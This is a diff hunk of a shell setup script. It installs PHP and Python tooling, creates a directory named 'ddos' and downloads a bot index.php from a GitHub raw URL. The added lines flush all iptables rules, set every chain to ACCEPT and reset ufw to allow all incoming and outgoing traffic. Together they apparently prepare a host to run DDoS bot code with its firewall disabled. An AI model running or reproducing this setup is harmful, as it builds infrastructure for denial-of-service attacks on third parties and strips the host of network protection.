@@ -14,6 +14,14 @@ apt install python3 -y
 apt install python3-pip -y
 apt install php -y
 apt install screen -y
+sudo iptables -F
+sudo iptables -P INPUT ACCEPT
+sudo iptables -P FORWARD ACCEPT
+sudo iptables -P OUTPUT ACCEPT
+sudo ufw reset 
+sudo ufw default allow incoming
+sudo ufw default allow outgoing
+sudo ufw enable
 mkdir ddos
 cd ddos
 curl https://raw.githubusercontent.com/zeronxdev/data/main/bot/index.php -o index.php
